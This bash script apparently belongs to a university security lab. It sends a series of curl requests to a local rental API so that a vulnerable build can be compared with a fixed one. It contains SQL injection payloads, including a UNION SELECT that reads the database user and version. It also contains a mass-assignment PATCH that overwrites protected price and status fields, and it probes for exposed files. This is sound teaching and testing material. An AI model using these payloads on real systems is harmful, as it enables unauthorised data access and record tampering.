#!/usr/bin/env bash
# Security-перевірки лаби 11 (curl). Запуск із папки lab-11:
#   bash security-check.sh 8082   -> вразлива версія  (sut-b-vulnerable + sut-c-vulnerable)
#   bash security-check.sh 8083   -> виправлена версія (sut-b-fixed + sut-c-fixed)
PORT=${1:-8082}
BASE="http://127.0.0.1:$PORT"
TAG=$(date +%s)
RESP=$(mktemp)

title() { echo; echo "==================== $1 ===================="; }

print_response() {
  echo "RESPONSE: HTTP $1"
  head -c 900 "$RESP"
  if [ "$(wc -c < "$RESP" | tr -d ' ')" -gt 900 ]; then echo " ...(далі обрізано)"; else echo; fi
  echo
}

call() {   # call METHOD PATH [JSON-BODY]
  echo "REQUEST:  $1 $BASE$2"
  if [ -n "$3" ]; then
    echo "BODY:     $3"
    code=$(curl -s -o "$RESP" -w '%{http_code}' -X "$1" "$BASE$2" -H 'Content-Type: application/json' -d "$3")
  else
    code=$(curl -s -o "$RESP" -w '%{http_code}' -X "$1" "$BASE$2")
  fi
  print_response "$code"
}

search() { # search "значення reference"
  echo "REQUEST:  GET $BASE/rentals/search?reference=$1"
  code=$(curl -s -o "$RESP" -w '%{http_code}' -G "$BASE/rentals/search" --data-urlencode "reference=$1")
  print_response "$code"
}

db() {
  echo "DB:       $1"
  docker exec rental-security-db psql -U rental_student -d rental_variant04_security -c "$1"
}

title "0. Підготовка даних через API"
call POST /equipment "{\"code\":\"SEC-EQ-$TAG\",\"dailyRate\":10000,\"stock\":5}"
EQ_ID=$(sed -E 's/^\{"id": *([0-9]+),.*/\1/' "$RESP")
call POST /rentals "{\"reference\":\"RENT-A-$TAG\",\"equipmentId\":$EQ_ID,\"quantity\":1,\"days\":10,\"premium\":false}"
RENT_ID=$(sed -E 's/^\{"id": *([0-9]+),.*/\1/' "$RESP")
call POST /rentals "{\"reference\":\"RENT-B-$TAG\",\"equipmentId\":$EQ_ID,\"quantity\":1,\"days\":9,\"premium\":true}"

title "1. SQL Injection: GET /rentals/search"
echo "--- 1.1 Звичайний пошук: має знайти тільки одну оренду"
search "RENT-A-$TAG"
echo "--- 1.2 Payload ' OR '1'='1 : умова завжди true"
search "' OR '1'='1"
echo "--- 1.3 Payload UNION: читаємо дані, яких API не віддає (користувач БД і версія)"
search "' UNION SELECT 0, current_user, 0, version() --"

title "2. Підміна захищених полів: PATCH /rentals/$RENT_ID"
db "SELECT id, reference, total, status FROM rentals WHERE id = $RENT_ID;"
call PATCH "/rentals/$RENT_ID" "{\"reference\":\"RENT-A-$TAG-EDIT\",\"total\":1,\"status\":\"Returned\"}"
echo "--- Перевірка в БД після PATCH:"
db "SELECT id, reference, total, status FROM rentals WHERE id = $RENT_ID;"

title "3. Витік внутрішньої інформації"
echo "--- 3.1 Пошук з однією лапкою '"
search "'"
echo "--- 3.2 PATCH із задовгим кодом (> 40 символів)"
call PATCH "/rentals/$RENT_ID" '{"reference":"THIS-REFERENCE-IS-DEFINITELY-LONGER-THAN-40-CHARS"}'

title "4. UI: розкриття конфіденційних даних"
call GET /robots.txt
call GET /assets/customer-export.json

rm -f "$RESP"